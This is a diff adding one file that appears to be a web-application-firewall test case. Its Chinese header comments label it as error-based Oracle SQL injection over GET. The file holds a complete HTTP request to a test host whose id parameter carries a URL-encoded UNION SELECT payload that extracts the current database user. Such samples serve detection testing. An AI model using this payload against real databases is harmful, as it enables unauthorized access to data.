@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_报错注入-06506311
+# 攻击者基于报错查询，将"union select rtrim(extract(xmlagg(xmlelement("s",(select user from dual) || ',')),'/s').getstringval(),'",') a from all_users"语句注入到 SQL 查询参数中，利用函数rtrim、extract、xmlagg、xmlelement、getstringval获取当前用户信息。
+GET /?id=1%20union%20select%20rtrim%28extract%28xmlagg%28xmlelement%28%22s%22%2C%28select%20user%20from%20dual%29%20%7C%7C%20%27%2C%27%29%29%2C%27%2Fs%27%29.getstringval%28%29%2C%27%22%2C%27%29%20a%20from%20all_users&bid=hd_tag_m8mv240t HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv240t
+RM-PRO-Token: 6f310b8834db01e0ce429708f4a3e228
+RM-PRO-Time: 1742808357074
+User-Agent: curl/7.83.1
+
